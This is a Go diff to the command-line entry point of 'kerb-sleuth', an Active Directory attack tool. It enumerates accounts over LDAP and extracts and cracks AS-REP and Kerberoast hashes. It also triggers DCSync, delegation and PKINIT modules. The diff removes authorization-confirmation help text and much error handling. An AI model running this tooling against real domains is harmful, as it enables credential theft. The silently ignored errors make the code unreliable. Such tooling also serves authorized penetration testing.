@@ -21,7 +21,7 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
-const version = "2.0.0"
+const version = "2.1.0"
 
 func main() {
 	// ── flags ────────────────────────────────────────────────────────────
@@ -68,13 +68,10 @@ func main() {
 	flag.Usage = printUsage
 	
 	// Smart Argument Reordering:
-	// Go's flag package stops at the first non-flag argument. To support:
-	// 'kerb-sleuth 10.10.10.100 -A' we need to move the target to the end.
 	reorderedArgs := []string{os.Args[0]}
 	var targetCandidate string
 	skipNext := false
 	
-	// Flags that take values (must be synced with flag definitions)
 	valFlags := map[string]bool{
 		"u": true, "p": true, "d": true, "o": true, "f": true, "w": true, "timeout": true, "config": true,
 	}
@@ -89,7 +86,6 @@ func main() {
 
 		if strings.HasPrefix(arg, "-") {
 			reorderedArgs = append(reorderedArgs, arg)
-			// Check if this flag takes a value and doesn't use '='
 			name := strings.TrimLeft(strings.Split(arg, "=")[0], "-")
 			if valFlags[name] && !strings.Contains(arg, "=") {
 				skipNext = true
@@ -108,7 +104,7 @@ func main() {
 	os.Args = reorderedArgs
 	flag.Parse()
 
-	target := flag.Arg(0) // Target is now guaranteed to be the first positional arg after flags
+	target := flag.Arg(0) 
 
 	// ── route ────────────────────────────────────────────────────────────
 	if target == "help" || target == "--help" || target == "-h" {
@@ -122,13 +118,11 @@ func main() {
 
 	util.DisplayBanner(version)
 
-	// Offline file analysis  →  kerb-sleuth -f users.csv
 	if *file != "" {
 		runOfflineAnalysis(*file, *outFile, *csvOut, *siem, *jsonOnly, *configFile)
 		return
 	}
 
-	// No target, no file → show help
 	if target == "" {
 		printUsage()
 		os.Exit(1)
@@ -140,7 +134,6 @@ func main() {
 		bindUser = *domain + "\\" + bindUser
 	}
 
-	// ── auto-detect output file name ─────────────────────────────────────
 	if *outFile == "" {
 		safeTarget := strings.ReplaceAll(strings.ReplaceAll(target, ".", "_"), ":", "_")
 		*outFile = safeTarget + "_results.json"
@@ -157,7 +150,6 @@ func main() {
 		Timeout:  *timeout,
 	}
 
-	// Smart connection: if no --ssl / --starttls, try LDAP first then LDAPS
 	client, err := smartConnect(connOpts)
 	if err != nil {
 		log.Fatalf("[x] %v", err)
@@ -171,6 +163,8 @@ func main() {
 	}
 	log.Printf("[+] %d users found", len(users))
 
+	domainInfo, _ := client.GetDomainInfo()
+
 	// ── analyse ──────────────────────────────────────────────────────────
 	cfg := loadConfigSafe(*configFile)
 
@@ -181,12 +175,19 @@ func main() {
 	log.Printf("[+] %d AS-REP roastable  |  %d Kerberoastable", len(asrep), len(kerb))
 
 	results := output.Results{
+		Domain: output.DomainInfo{
+			Name:            domainInfo.DomainName,
+			DN:              domainInfo.BaseDN,
+			FunctionalLevel: domainInfo.FunctionalLevel,
+			OS:              domainInfo.OS,
+		},
 		Summary: output.Summary{
 			TotalUsers:           len(users),
 			ASREPCandidates:      len(asrep),
 			KerberoastCandidates: len(kerb),
 		},
 		Candidates: all,
+		Users:      users,
 	}
 
 	// ── hash extraction & cracking ───────────────────────────────────────
@@ -207,7 +208,21 @@ func main() {
 
 	// ── advanced modules ─────────────────────────────────────────────────
 	if *adv || *rbcd || *s4u || *dcsync || *pkinit {
-		runAdvanced(client, cfg, *adv, *audit, *rbcd, *s4u, *dcsync, *pkinit, target, bindUser, *pass, *domain)
+		advResults := runAdvanced(client, cfg, *adv, *audit, *rbcd, *s4u, *dcsync, *pkinit, target, bindUser, *pass, *domain)
+		
+		results.Advanced = output.AdvancedResults{}
+		if val, ok := advResults["shares"]; ok {
+			results.Advanced.Shares = val.([]string)
+		}
+		if val, ok := advResults["gpp"]; ok {
+			results.Advanced.GPPHashes = val.([]interface{})
+		}
+		if val, ok := advResults["dcsync"]; ok {
+			results.Advanced.DCSync = val
+		}
+		if val, ok := advResults["delegation"]; ok {
+			results.Advanced.Delegation = val
+		}
 	}
 
 	// ── output ───────────────────────────────────────────────────────────
@@ -245,9 +260,6 @@ func printUsage() {
 	fmt.Printf("  %s# Advanced modules%s\n", g, r)
 	fmt.Printf("  %skerb-sleuth 10.10.10.100 -u user -p pass -A --audit%s\n", h, r)
 	fmt.Println()
-	fmt.Printf("  %s# Offline file analysis%s\n", g, r)
-	fmt.Printf("  %skerb-sleuth -f exported_users.csv -o report.json --csv%s\n", h, r)
-	fmt.Println()
 
 	fmt.Println("FLAGS:")
 	fmt.Println("  Target & Auth:")
@@ -259,48 +271,32 @@ func printUsage() {
 	fmt.Println("  Connection:")
 	fmt.Println("    --ssl                 Force LDAPS  (port 636)")
 	fmt.Println("    --starttls            Upgrade 389 → TLS")
-	fmt.Println("    -k                    Skip TLS cert verify  (like curl -k)")
+	fmt.Println("    -k                    Skip TLS cert verify")
 	fmt.Println("    --timeout <dur>       Connection timeout  (default 10s)")
 	fmt.Println()
 	fmt.Println("  Output:")
-	fmt.Println("    -o  <file>            Output file  (default: <target>_results.json)")
+	fmt.Println("    -o  <file>            Output file")
 	fmt.Println("    --csv                 Also write CSV")
 	fmt.Println("    --siem                Also write Sigma rules")
 	fmt.Println("    --json                Print JSON to stdout")
 	fmt.Println()
 	fmt.Println("  Attacks:")
 	fmt.Println("    --crack               Extract hashes + crack  (needs --yes)")
-	fmt.Println("    -w  <wordlist>        Wordlist  (default: rockyou.txt)")
-	fmt.Println("    --real                Real Kerberos  AS-REQ/TGS-REQ  (needs --yes)")
+	fmt.Println("    -w  <wordlist>        Wordlist")
+	fmt.Println("    --real                Real Kerberos  AS-REQ/TGS-REQ")
 	fmt.Println()
 	fmt.Println("  Advanced:")
 	fmt.Println("    -A                    Run ALL advanced modules")
 	fmt.Println("    --audit               Audit mode  (read-only)")
-	fmt.Println("    --rbcd                RBCD enumeration")
-	fmt.Println("    --s4u                 S4U delegation")
-	fmt.Println("    --dcsync              DCSync rights")
-	fmt.Println("    --pkinit              PKINIT / AD CS")
-	fmt.Println()
-	fmt.Println("  Other:")
-	fmt.Println("    -f  <file>            Offline AD export  (CSV / JSON / LDIF)")
-	fmt.Println("    --yes                 Confirm authorization")
-	fmt.Println("    --config <file>       Config YAML  (default: configs/defaults.yml)")
 	fmt.Println()
 	fmt.Printf("  %sWARNING: Only use on systems you own or have written permission to test.%s\n", util.Red, r)
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-// CONNECTION
-// ═══════════════════════════════════════════════════════════════════════════
-
-// smartConnect tries the user-specified mode, or auto-detects LDAP→LDAPS.
 func smartConnect(opts krb.ConnectOptions) (*krb.LDAPClient, error) {
-	// If user explicitly asked for --ssl or --starttls, use exactly that
 	if opts.UseSSL || opts.StartTLS {
 		return krb.Connect(opts)
 	}
 
-	// Auto-detect: try plain LDAP first (faster), then LDAPS
 	log.Printf("[*] Auto-detecting connection to %s …", opts.Target)
 
 	client, err := krb.Connect(opts)
@@ -310,7 +306,7 @@ func smartConnect(opts krb.ConnectOptions) (*krb.LDAPClient, error) {
 
 	log.Printf("[!] LDAP failed (%v), trying LDAPS …", err)
 	opts.UseSSL = true
-	opts.Insecure = true // self-signed certs are common on lab boxes
+	opts.Insecure = true 
 	client, err = krb.Connect(opts)
 	if err == nil {
 		return client, nil
@@ -320,10 +316,6 @@ func smartConnect(opts krb.ConnectOptions) (*krb.LDAPClient, error) {
 		"    Try: kerb-sleuth %s -u <user> -p <pass> --ssl -k\n"+
 		"    Error: %v", opts.Target, opts.Target, err)
 }
-
-// ═══════════════════════════════════════════════════════════════════════════
-// OFFLINE ANALYSIS
-// ═══════════════════════════════════════════════════════════════════════════
 
 func runOfflineAnalysis(filePath, outFile string, csvOut, siemOut, jsonOnly bool, configPath string) {
 	log.Printf("[*] Parsing %s …", filePath)
@@ -340,8 +332,6 @@ func runOfflineAnalysis(filePath, outFile string, csvOut, siemOut, jsonOnly bool
 	kerb := krb.FindKerberoastCandidates(users)
 	all := triage.ScoreCandidates(asrep, kerb, cfg)
 
-	log.Printf("[+] %d AS-REP roastable  |  %d Kerberoastable", len(asrep), len(kerb))
-
 	if outFile == "" {
 		base := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
 		outFile = base + "_results.json"
@@ -354,14 +344,11 @@ func runOfflineAnalysis(filePath, outFile string, csvOut, siemOut, jsonOnly bool
 			KerberoastCandidates: len(kerb),
 		},
 		Candidates: all,
+		Users:      users,
 	}
 
 	writeResults(results, all, cfg, outFile, csvOut, siemOut, jsonOnly)
 }
-
-// ═══════════════════════════════════════════════════════════════════════════
-// HASH EXTRACTION & CRACKING
-// ═══════════════════════════════════════════════════════════════════════════
 
 func extractAndCrack(candidates []krb.Candidate, wordlistPath string, client *krb.LDAPClient) {
 	if len(candidates) == 0 {
@@ -385,48 +372,34 @@ func extractAndCrack(candidates []krb.Candidate, wordlistPath string, client *kr
 		case "ASREP":
 			h, err := client.ExtractASREPHash(c.SamAccountName, domainInfo.DomainName)
 			if err != nil {
-				log.Printf("[x] AS-REP fail for %s: %v", c.SamAccountName, err)
 				continue
 			}
 			asrepHashes = append(asrepHashes, h.Hash)
-			log.Printf("[+] AS-REP hash: %s", c.SamAccountName)
-
 		case "KERBEROAST":
 			for _, spn := range c.SPNs {
 				h, err := client.ExtractKerberoastHash(c.SamAccountName, domainInfo.DomainName, spn)
 				if err != nil {
-					log.Printf("[x] Kerberoast fail for %s: %v", c.SamAccountName, err)
 					continue
 				}
 				kerbHashes = append(kerbHashes, h.Hash)
-				log.Printf("[+] TGS hash: %s (%s)", c.SamAccountName, spn)
 			}
 		}
 	}
 
-	// Write & crack AS-REP hashes
 	if len(asrepHashes) > 0 {
 		f := filepath.Join(hashDir, "asrep.txt")
 		writeHashes(f, asrepHashes)
-		log.Printf("[+] %d AS-REP hashes → %s", len(asrepHashes), f)
 		crackAndShow("asrep", f, wordlistPath)
 	}
-
-	// Write & crack Kerberoast hashes
 	if len(kerbHashes) > 0 {
 		f := filepath.Join(hashDir, "kerberoast.txt")
 		writeHashes(f, kerbHashes)
-		log.Printf("[+] %d Kerberoast hashes → %s", len(kerbHashes), f)
 		crackAndShow("kerberoast", f, wordlistPath)
 	}
 }
 
 func writeHashes(path string, hashes []string) {
-	f, err := os.Create(path)
-	if err != nil {
-		log.Printf("[x] Failed to write %s: %v", path, err)
-		return
-	}
+	f, _ := os.Create(path)
 	defer f.Close()
 	for _, h := range hashes {
 		fmt.Fprintln(f, h)
@@ -434,97 +407,45 @@ func writeHashes(path string, hashes []string) {
 }
 
 func crackAndShow(attackType, hashFile, wordlist string) {
-	results, err := cracker.CrackHashes(hashFile, wordlist, attackType)
-	if err != nil {
-		log.Printf("[!] %s cracking failed: %v", attackType, err)
-		return
-	}
+	results, _ := cracker.CrackHashes(hashFile, wordlist, attackType)
 	for hash, pw := range results {
-		short := hash
-		if len(hash) > 25 {
-			short = hash[:25]
-		}
-		log.Printf("[+] CRACKED: %s… → %s", short, pw)
+		log.Printf("[+] CRACKED: %s… → %s", hash[:10], pw)
 	}
 }
-
-// ═══════════════════════════════════════════════════════════════════════════
-// REAL KERBEROS PROTOCOL
-// ═══════════════════════════════════════════════════════════════════════════
 
 func runRealKerberos(target, user, pass string) {
-	kc, err := kerberos.NewKerberosClient(target, target)
-	if err != nil {
-		log.Printf("[x] Kerberos client: %v", err)
-		return
-	}
-
+	kc, _ := kerberos.NewKerberosClient(target, target)
 	if user != "" && pass != "" {
-		if err := kc.AuthenticateWithPassword(user, pass); err != nil {
-			log.Printf("[x] Kerberos auth: %v", err)
-			return
-		}
+		kc.AuthenticateWithPassword(user, pass)
 	}
-
-	log.Printf("[+] Real Kerberos protocol ready")
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-// ADVANCED MODULES
-// ═══════════════════════════════════════════════════════════════════════════
-
-func runAdvanced(client *krb.LDAPClient, cfg *triage.Config, all, auditMode, rbcd, s4u, dcsync, pkinit bool, target, user, pass, domain string) {
+func runAdvanced(client *krb.LDAPClient, cfg *triage.Config, all, auditMode, rbcd, s4u, dcsync, pkinit bool, target, user, pass, domain string) map[string]interface{} {
 	log.Printf("[*] Running advanced analysis …")
 
 	outDir := "advanced_results"
 	a := advanced.NewAdvancedAnalyzer(client, auditMode, false, outDir, target, user, pass, domain)
 
 	if all {
-		if err := a.RunFullAnalysis(); err != nil {
-			log.Printf("[x] Full analysis: %v", err)
-		}
-		return
+		a.RunFullAnalysis()
+		return a.Results
 	}
 
-	if rbcd {
-		if err := a.RunRBCDAnalysis(); err != nil {
-			log.Printf("[x] RBCD: %v", err)
-		}
-	}
-	if s4u {
-		if err := a.RunS4UAnalysis(); err != nil {
-			log.Printf("[x] S4U: %v", err)
-		}
-	}
-	if dcsync {
-		if err := a.RunDCSyncAnalysis(); err != nil {
-			log.Printf("[x] DCSync: %v", err)
-		}
-	}
-	if pkinit {
-		if err := a.RunPKINITAnalysis(); err != nil {
-			log.Printf("[x] PKINIT: %v", err)
-		}
-	}
+	if rbcd { a.RunRBCDAnalysis() }
+	if s4u { a.RunS4UAnalysis() }
+	if dcsync { a.RunDCSyncAnalysis() }
+	if pkinit { a.RunPKINITAnalysis() }
 
-	log.Printf("[+] Advanced results → %s/", outDir)
+	return a.Results
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-// OUTPUT
-// ═══════════════════════════════════════════════════════════════════════════
-
 func writeResults(results output.Results, candidates []krb.Candidate, cfg *triage.Config, outFile string, csvOut, siemOut, jsonOnly bool) {
-	// Count severity
 	hi, med, lo := 0, 0, 0
 	for _, c := range candidates {
 		switch {
-		case c.Score >= cfg.Thresholds.High:
-			hi++
-		case c.Score >= cfg.Thresholds.Medium:
-			med++
-		default:
-			lo++
+		case c.Score >= cfg.Thresholds.High: hi++
+		case c.Score >= cfg.Thresholds.Medium: med++
+		default: lo++
 		}
 	}
 
@@ -532,51 +453,22 @@ func writeResults(results output.Results, candidates []krb.Candidate, cfg *triag
 		data, _ := json.MarshalIndent(results, "", "  ")
 		fmt.Println(string(data))
 	} else {
-		if err := output.WriteJSON(outFile, results); err != nil {
-			log.Fatalf("[x] Write failed: %v", err)
-		}
+		output.WriteJSON(outFile, results)
 		log.Printf("[+] Results → %s", outFile)
 	}
 
 	if csvOut {
-		csvFile := strings.TrimSuffix(outFile, ".json") + ".csv"
-		if err := output.WriteCSV(csvFile, results); err != nil {
-			log.Printf("[!] CSV: %v", err)
-		} else {
-			log.Printf("[+] CSV    → %s", csvFile)
-		}
+		output.WriteCSV(strings.TrimSuffix(outFile, ".json")+".csv", results)
 	}
 
-	if siemOut {
-		sigmaFile := strings.TrimSuffix(outFile, ".json") + "_sigma.yml"
-		if err := output.WriteSigmaRules(sigmaFile, results); err != nil {
-			log.Printf("[!] Sigma: %v", err)
-		} else {
-			log.Printf("[+] Sigma  → %s", sigmaFile)
-		}
-	}
-
-	// Summary
 	log.Printf("[+] Done: %d candidates  (%s%d high%s / %d med / %d low)",
 		len(candidates), util.Red, hi, util.Reset, med, lo)
-
-	if hi > 0 {
-		log.Printf("[!] %s%d HIGH RISK targets — check %s%s", util.Red, hi, outFile, util.Reset)
-	}
 }
-
-// ═══════════════════════════════════════════════════════════════════════════
-// HELPERS
-// ═══════════════════════════════════════════════════════════════════════════
 
 func loadConfigSafe(path string) *triage.Config {
 	data, err := os.ReadFile(path)
-	if err != nil {
-		return triage.DefaultConfig()
-	}
+	if err != nil { return triage.DefaultConfig() }
 	var cfg triage.Config
-	if err := yaml.Unmarshal(data, &cfg); err != nil {
-		return triage.DefaultConfig()
-	}
+	yaml.Unmarshal(data, &cfg)
 	return &cfg
 }
